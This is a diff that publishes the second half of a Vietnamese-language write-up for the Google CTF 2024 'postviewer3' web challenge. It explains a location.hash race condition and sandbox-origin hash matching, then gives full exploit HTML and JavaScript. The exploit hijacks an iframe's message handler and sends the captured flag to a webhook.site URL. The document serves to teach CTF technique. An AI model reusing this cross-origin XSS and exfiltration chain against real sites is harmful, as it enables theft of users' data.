@@ -6,7 +6,7 @@ categories: ["Writeup"]
 tags: ["Web"]
 #externalUrl: ""
 date: 2024-06-25
-draft: true
+draft: false
 authors:
   - Shin24
 ---
@@ -324,3 +324,164 @@ const hash = await calculateHash(body, product, window.origin, location.href);
 
 ![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/99c29bb3-2372-4e3a-9fd2-f66f6966c49b)
 
+Vậy thì sẽ ra sao nếu `location.hash` bị đổi sau khi `location.hash` bị reassign và trước khi được đưa vào hàm `calculateHash`? Lúc này thì ta sẽ control được cả 4 factor tạo nên sha256 hash nên ta sẽ biết được sbx origin được sử dụng để send flag đến. Vậy biết được origin rồi thì sao nữa nhỉ... tại đây ta có thể dựa trên bug XSS ở sbx origin ban đầu, lợi dụng nó để XSS sbx origin của iframe trong challenge
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/0d26161e-a3da-445f-a1e3-d70062ba7d1b)
+
+Vấn đề là làm sao để sbx origin mà ta XSS có cùng origin (cùng hash) với origin bên trong server được? Vì nếu muốn XSS được sbx origin thì body của ta sẽ khác với body mà sbx origin của challenge dùng chứ đúng không? Đến đây thì mình nghĩ maybe là có hash collision chăng? Nhưng mà sha256 thì collison thế quái nào được nhỉ... Sau một tí thời gian thì mình nhận ra là nó đơn giản hơn thế nhiều, ta chỉ cần dùng lại body trong `evaluatorHtml` là được, lúc này body sẽ trùng với body mà challenge sử dụng, và trên hết là lúc này ta sẽ pass được phần check `e.source !== parent` vì theo sơ đồ bên trên `exploit.html` chắc chắn sẽ là parent của sbx origin này.
+
+Còn một điều nữa đó là `TRUSTED_ORIGIN` vẫn chưa giống với `TRUSTED_ORIGIN` của challenge, ở challenge thì argument thứ 3 sẽ là `https://postviewer3-web.2024.ctfcompetition.com` (window.origin), còn đối với sbx origin mà ta chuẩn bị XSS, ta sẽ phải để `TRUSTED_ORIGIN` là origin mà ta dùng để host `exploit.html` (ngrok maybe) 
+
+Cách giải quyết cũng không khó lắm, vì control được hash của challenge thông qua race condition, ta có thể append `TRUSTED_ORIGIN` của ta (ngrok) vào hash đó, sau đó trong phần body mà ta chuẩn bị postMessage qua cho origin sbx ta sẽ thêm `postviewerhttps://postviewer3-web.2024.ctfcompetition.comhttps://postviewer3-web.2024.ctfcompetition.com/#` vào để nó khớp với server, nhằm generate ra 2 hash giống nhau
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/6e004d74-dfda-4939-9f82-20bb20ff5e62)
+
+```js
+const prepend_chunk = evaluatorHtml + "postviewer" + "https://postviewer3-web.2024.ctfcompetition.com" + "https://postviewer3-web.2024.ctfcompetition.com/#" 
+```
+
+### Double race condition
+
+Tiếp đến thì khi race condition trigger hash change vào đúng race window, ta sẽ có window bị XSS và iframe bên trong của challenge có origin giống nhau, do đó từ window bị XSS ta có thể thực hiện `win.frames[0].eval(...)`. Vấn đề là ở iframe này thì origin của nó khác với blob iframe bên trong, bởi blob URL sẽ có origin là null, và origin là null thì sẽ luôn luôn fail SOP (đúng vậy, 2 null origin cũng sẽ được xem là khác origin). Ở đây ta sẽ thực hiện set `win.frames[0].onmessage = ...` để setup một message handler mới trước khi bên challenge thực hiện postMessage với nội dung flag qua nhằm gửi flag về webhook (vì body gửi qua là một ArrayBuffer nên ta cũng sẽ cần convert nó qua string trước khi fetch flag về nữa).
+
+### StrictOriginIsolation
+
+Ta thấy chrome của bot enable một feature flag 
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/08d4bfff-0979-41eb-a0f0-098c63f7e22d)
+
+> Strict Origin Isolation would improve security by ensuring different origins do not share a process with each other, but it poses a risk of increased resource usage
+
+> When enabled, Chrome opens up a dedicated process for each website you access and creates a strict wall between them that keeps them separate. This creates a dedicated sandbox for each website where neither they can access information of other websites nor their information could be accessed by other websites.
+
+Ngắn gọn là mỗi website ta access sẽ được render trong một process riêng biệt, đây là một mitigation đối với meltdown attack, mitigation sẽ đi với các drawback nhất định và ở trường hợp này là CPU usage và thời gian xử lý, các tác vụ sẽ cần thời gian lâu hơn để thực và do đó, so với khi không enable feature này thì khi thực hiện race ta sẽ cần nới lỏng thời gian sleep đi, và nếu ta để ý thì
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/5a75e7d7-a53b-4362-8f5c-eb402ed30cd5)
+
+Có một lệnh `sleep` tưởng như vô nghĩa được chèn vào giữa đoạn xử lý hash, thật ra thì một lệnh này là đã đủ và có lẽ là không cần ta phải thêm một lệnh sleep nào khác trong exploit nữa, có lẽ là intended của tác giả để làm race dễ dính hơn. 
+
+### Exploit
+
+```html
+<html>
+    <iframe></iframe>
+    <script src="a.js"></script>
+    <script>
+        const the_hash = `postviewerhttps://75a7-203-167-11-246.ngrok-free.app`;
+        // const the_hash = `file-ff582564efb8cb8229f1db607c35ae35c4b59e27`;
+        const payload = `
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        async function race(win) {
+            while (true) {
+                try {
+                    await sleep(800);
+                    win.location.replace("https://postviewer3-web.2024.ctfcompetition.com/#0")
+                    win.location.replace("https://postviewer3-web.2024.ctfcompetition.com/#${the_hash}")
+                    await sleep(0);
+                    // console.log(win.frames[0].location.href)
+                    win.frames[0].window.onmessage = (e) => {
+                        // location.href = "https://webhook.site/cec28ede-90d8-41a4-9ef6-4f811d83e750/?c="+123
+                        var enc = new TextDecoder("utf-8");
+                        location.href = "https://webhook.site/cec28ede-90d8-41a4-9ef6-4f811d83e750/?c="+enc.decode(e.data.body)
+                    }
+                } catch (e) {}
+            }
+        }
+
+        for (let i = 0; i < 100; i++) {
+            race(open("https://postviewer3-web.2024.ctfcompetition.com/"));
+        }
+        
+        `
+
+        const ifrm = document.querySelector("iframe");
+        
+        const prepend_chunk = evaluatorHtml + "postviewer" + "https://postviewer3-web.2024.ctfcompetition.com" + "https://postviewer3-web.2024.ctfcompetition.com/#" 
+        ifrm.src="https://sbx-1npy2a9m4fd8g0r5jeg1qwkarykrt1gnvdxxhh5ia0nxk8nvrb.postviewer3-web.2024.ctfcompetition.com/postviewer/shim.html?o=https://75a7-203-167-11-246.ngrok-free.app"
+        ifrm.addEventListener("load", function() {
+            ifrm.contentWindow.postMessage(
+                {
+                    "body": prepend_chunk,
+                    "mimeType": "text/html",
+                    "salt": ""
+                }, "*"
+            );
+
+            setTimeout(() => {
+                ifrm.contentWindow.postMessage(
+                    {
+                        "eval":payload,
+                        "body": "aaa",
+                        "mimeType": "text/html",
+                        "salt": ""
+                    }, "*"
+                );
+            }, 1000)
+        })
+
+    </script>
+
+    <!-- <script>
+        const win = window.open("https://postviewer3-web.2024.ctfcompetition.com/#1", "_blank");
+
+    </script> -->
+</html>
+```
+
+a.js:
+
+```js
+const evaluatorHtml = `
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>Evaluator</title>
+
+    <script>
+      onmessage = e => {
+        if(e.source !== parent) {
+          throw /not parent/;
+        };
+        if(e.data.eval){
+          eval(e.data.eval);
+        }
+      }
+      onload = () => {
+        parent.postMessage('loader ready','*');
+      }
+    </script>
+
+    <style>
+      body{
+        padding: 0px;
+        margin: 0px;
+      }
+      iframe{
+        width: 100vw;
+        height: 100vh;
+        border: 0;
+      }
+      .spinner {
+        background: url(https://storage.googleapis.com/gctf-postviewer/spinner.svg) center no-repeat;
+      }
+      .spinner iframe{
+        opacity: 0.2
+      }
+    </style>
+  </head>
+  <body>
+    <div id="container" class="spinner"></div>
+  </body>
+</html>
+`;
+```
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/e0b3c7f1-e26b-4945-bff9-df28a1ff4cb5)
+
+## GAME ARCADE (To be updated...)
+
+## IN-THE-SHADOWS (To be updated...)
